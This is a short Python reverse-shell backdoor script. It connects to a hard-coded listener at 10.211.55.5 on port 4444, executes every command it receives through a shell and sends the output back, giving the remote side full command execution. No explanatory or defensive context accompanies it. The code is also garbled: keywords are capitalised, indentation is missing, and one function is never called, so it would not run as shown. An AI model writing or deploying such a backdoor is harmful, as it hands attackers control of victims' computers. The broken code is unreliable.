import socket
import subprocess
import os


LIP = '10.211.55.5'
LPORT = '4444'
Def connect_backdoor(ip, port):
Try:
S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
S.connect((ip, port))
Return s
Except Exception as e:
Print(f"Failed to connect: {e}")
Return None
Def execute_command(s, command):
Try:
S.send(command.encode())
Response = s.recv(1024).decode()
Return response
Except Exception as e:
Print(f"Failed to execute command: {e}")
Return None
Def main():
S = connect_backdoor(LIP, int(LPORT))
If s:
While True:
Try:
Data = s.recv(1024).decode()
If not data:
Break
Elif data.lower() == 'exit':
Break
Else:
Output = subprocess.check_output(data, shell=True).decode()
S.send(output.encode())
Except Exception as e:
Print(f"Error occurred: {e}")
Break
S.close()
If __name__ == "__main__":
Main()
